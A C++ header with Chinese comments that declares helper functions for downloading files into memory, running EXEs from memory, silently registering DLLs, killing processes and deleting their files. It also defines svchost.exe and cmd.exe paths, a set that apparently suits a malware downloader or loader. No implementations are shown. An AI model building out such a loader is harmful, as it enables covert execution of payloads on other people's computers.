#pragma once
#include <string>
using namespace std;
#define MY_DEBUG

#define CMD_SYSTEM32 "C:\\windows\\system32\\cmd.exe"
#define CMD_SYSWOW64 "C:\\windows\\syswow64\\cmd.exe"
#define HOST_SYSTEM32 "C:\\windows\\system32\\svchost.exe"
#define HOST_SYSWOW64 "C:\\windows\\syswow64\\svchost.exe"
#define CMD_PARAM_START " /c start "
#define CMD_REG_SVR "regsvr32 /s "

//内存操作操作--------------------------------
//创建一个包括大小写字母和数字的随机字符串
string createRandStr(int num = 8);
//找到字符，并且将它们删除掉，返回删除数量
int findAndRemove(string& str, char c);
//找到字符串search，并且将它的头部替换成replace
//找到并替换后，返回替换的位置，找不到则否则返回-1
int findAndReplace(char* buf, long len,
	const char* search,	const char* replace);
//[node] item = value，cfgTxt是整个串，
//	node是[node],item是item，返回value
string getCfgItem(const string& cfgTxt,
	const string& node, const string& item);
//获取内存的MD5值: string MD5(const char input[], int len) 
//string getMd5FromMem(const char input[], int len);
//获取文件的MD5值，失败时，返回""
//string getMd5FromFile(const string& dirFile);
//内存解压，函数内部分配内存，返回长度或-1/2…
//int unzipFromMem(const char in[], int len, char*& out);

//文件操作----------------------------------
//判断文件是否存在，存在返回true，否则返回false
bool fileExist(const string& dirFile);
//删除文件，成功时返回true，否则返回false
bool removeFile(const string& dirFile);
//将文件读取到内存中，函数内部分配内存，返回文件长度或-1
long readFile(const string& dirFile, char*& buf);
//将内存数据，写入到文件，成功返回true，否则返回false
bool writeFile(const string& dirFile, const char buf[], long bufLen);
//创建文件夹，成功时返回true，否则返回false
bool createDir(const string& dirPath);
//删除文件夹，成功时返回true，否则返回false
bool removeDir(const string& dirPath);

//网络操作------------------------------------
#include <ws2tcpip.h>
//根据域名获取IP，成功则返回true
bool checkDomain(const string& str, string& result);
//下载文件到磁盘，成功则返回true，否则返回false
bool downloadFileToDisk(const string& url, const string& dirFile);
//下载文件到内存，函数内部分配内存，返回文件长度或-1/2…
long downloadFileToMem(const string& url, char*& buf);

//系统操作-----------------------------------
//获取系统的环境变量，比如"TEMP"，"APPDATA"
string getEnvVariable(const string& name);
//执行CMD命令行，成功则返回true，否则返回false
bool runCmdLine(const string& cmdStr);
//从文件运行EXE，成功则返回true，否则返回false
bool runExeFromFile(const string& dirFile);
bool runExeFromFile2(const string& dirFile);
//从文件加载DLL，成功则返回true，否则返回false
bool loadDllFromFile(const string& dirFile);
//杀掉进程dwProcessId，删除文件dirFile，成功则返回true
bool killProcessAndRemoveFile(const string& dirFile);
//从内存运行EXE，成功则返回0，否则返回正整数
int runExeFromMem(const char* data, long size);

//其他函数-----------------------------------
#include <windows.h>
//宽字符串和窄字符串的转换，内存在函数内部分配
PSTR ConvertWSTRtoSTR(PCWSTR pStrIn);
PWSTR ConvertSTRtoWSTR(PCSTR pStrIn);
PSTR ConvertTSTRtoSTR(PCTSTR pStrIn);
PTSTR ConvertSTRtoTSTR(PCSTR pStrIn);
//根据进程编号获取进程名称，失败则返回""
string GetProcessName(int processId);
